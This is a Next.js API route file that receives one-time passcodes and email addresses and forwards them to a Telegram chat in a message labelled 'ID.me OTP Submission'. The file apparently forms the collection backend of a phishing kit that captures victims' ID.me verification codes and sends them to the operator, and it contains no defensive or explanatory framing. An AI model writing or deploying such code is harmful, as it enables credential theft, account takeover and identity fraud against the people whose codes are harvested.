import { NextResponse } from "next/server";
import sendTelegramNotification from "@/app/lib/sendTelegramNotification";

export async function POST(req: Request) {
  try {
    const body = await req.json().catch(() => ({}));

    // Support both payload styles:
    // A) { otp: "123456", email: "x@y.com" }
    // B) { text: "..." }
    const otp = body?.otp;
    const email = body?.email;
    const text = body?.text;

    if (!otp && !text) {
      return NextResponse.json(
        { success: false, error: "Missing otp or text" },
        { status: 400 }
      );
    }

    const message =
      text ??
      `🔐 ID.me OTP Submission\n\nEmail: ${email ?? "N/A"}\nOtp: ${otp}`;

    await sendTelegramNotification(message);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Verify route failed:", error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
